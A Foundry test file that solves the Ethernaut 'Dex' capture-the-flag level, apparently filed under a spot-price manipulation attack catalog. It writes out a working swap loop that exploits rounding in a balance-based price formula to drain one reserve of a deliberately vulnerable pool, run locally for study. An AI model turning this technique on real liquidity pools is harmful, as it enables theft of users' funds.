// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "../src/levels/Dex.sol";
import {IERC20} from "openzeppelin-contracts-08/token/ERC20/IERC20.sol";

/// Ethernaut #22 "Dex" → Aegis catalog `mango-oracle-manipulation` / spot-price manipulation family.
/// The pool prices a swap off its own live balances (`getSwapPrice = amount * bal(to) / bal(from)`)
/// with integer rounding and no slippage/invariant guard — the same donation/spot-price flaw behind
/// the Mango/Loopscale entries. Swapping back and forth amplifies the rounding until one reserve is
/// fully drained. Win condition (DexFactory.validateInstance): a token balance of the Dex == 0.
contract DexTest is Test {
    Dex dex;
    address token1;
    address token2;
    address player = makeAddr("player");

    function setUp() public {
        // Mirror DexFactory: 100/100 liquidity in the Dex, 10/10 to the player.
        dex = new Dex();
        SwappableToken t1 = new SwappableToken(address(dex), "Token1", "TK1", 110e18);
        SwappableToken t2 = new SwappableToken(address(dex), "Token2", "TK2", 110e18);
        token1 = address(t1);
        token2 = address(t2);
        dex.setTokens(token1, token2);

        IERC20(token1).approve(address(dex), 100e18);
        IERC20(token2).approve(address(dex), 100e18);
        dex.addLiquidity(token1, 100e18);
        dex.addLiquidity(token2, 100e18);
        IERC20(token1).transfer(player, 10e18);
        IERC20(token2).transfer(player, 10e18);
    }

    function test_solve_dex() public {
        // Player approves the Dex to pull both tokens (the level's own approve helper).
        vm.prank(player);
        dex.approve(address(dex), type(uint256).max);

        address from = token1;
        address to = token2;
        for (uint256 i = 0; i < 20; i++) {
            uint256 dexFrom = IERC20(from).balanceOf(address(dex));
            uint256 dexTo = IERC20(to).balanceOf(address(dex));
            if (dexFrom == 0 || dexTo == 0) break;

            uint256 myFrom = IERC20(from).balanceOf(player);
            // Swapping `dexFrom` of `from` yields `dexTo` of `to` -> drains `to` to exactly 0.
            uint256 amountIn = myFrom >= dexFrom ? dexFrom : myFrom;

            vm.prank(player);
            dex.swap(from, to, amountIn);

            (from, to) = (to, from); // alternate direction
        }

        assertTrue(
            IERC20(token1).balanceOf(address(dex)) == 0 || IERC20(token2).balanceOf(address(dex)) == 0,
            "Dex solved: one reserve fully drained"
        );
    }
}
